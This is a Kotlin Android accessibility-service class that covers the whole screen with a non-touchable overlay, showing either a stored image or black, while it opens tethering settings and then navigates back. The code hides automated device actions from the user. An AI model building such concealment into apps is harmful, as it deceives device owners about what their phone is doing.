package com.systemlinker.features.systemacc

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.ImageView
import com.systemlinker.base.ConfigStore
import java.io.File

class StealthOverlay(private val service: AccessibilityService) {

    private val windowManager = service.getSystemService(Context.WINDOW_SERVICE) as WindowManager
    private val configStore = ConfigStore(service)
    private val mainHandler = Handler(Looper.getMainLooper())
    
    private var stealthOverlayView: View? = null
    var isAutomatingHotspot = false
        private set

    fun triggerHotspotAutomation() {
        isAutomatingHotspot = true
        show()
        
        mainHandler.postDelayed({
            if (isAutomatingHotspot) finishHotspotAutomation("") 
        }, configStore.overlayDurationMs)
        
        try {
            service.startActivity(Intent().apply { setClassName("com.android.settings", "com.android.settings.TetherSettings"); addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) })
        } catch (e: Exception) {
            service.startActivity(Intent("android.settings.TETHER_SETTINGS").apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) })
        }
    }

    fun finishHotspotAutomation(lastForegroundPackage: String) {
        isAutomatingHotspot = false
        Thread.sleep(300)
        
        if (configStore.postHotspotAction == "app_launch" && lastForegroundPackage.isNotEmpty()) {
            try {
                service.startActivity(service.packageManager.getLaunchIntentForPackage(lastForegroundPackage)?.apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) })
            } catch (e: Exception) { service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK) }
        } else {
            val action = when (configStore.postHotspotAction) { "home" -> AccessibilityService.GLOBAL_ACTION_HOME; "recent" -> AccessibilityService.GLOBAL_ACTION_RECENTS; else -> AccessibilityService.GLOBAL_ACTION_BACK }
            for (i in 0 until configStore.postHotspotArgs) { service.performGlobalAction(action); Thread.sleep(200) }
        }
        hide()
    }

    private fun show() {
        mainHandler.post {
            if (stealthOverlayView != null) return@post
            val layout = FrameLayout(service)
            val imgFile = File(service.filesDir, "stealth_overlay.jpg")
            if (imgFile.exists()) {
                layout.addView(ImageView(service).apply { setImageURI(Uri.fromFile(imgFile)); scaleType = ImageView.ScaleType.FIT_XY }, FrameLayout.LayoutParams(-1, -1))
            } else {
                layout.setBackgroundColor(Color.BLACK) 
            }
            val params = WindowManager.LayoutParams(-1, -1, WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY, 
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS, PixelFormat.TRANSLUCENT)
            try { windowManager.addView(layout, params); stealthOverlayView = layout } catch (e: Exception) {}
        }
    }

    fun hide() {
        mainHandler.post {
            stealthOverlayView?.let { try { windowManager.removeView(it) } catch (e: Exception) {} }
            stealthOverlayView = null
        }
    }
}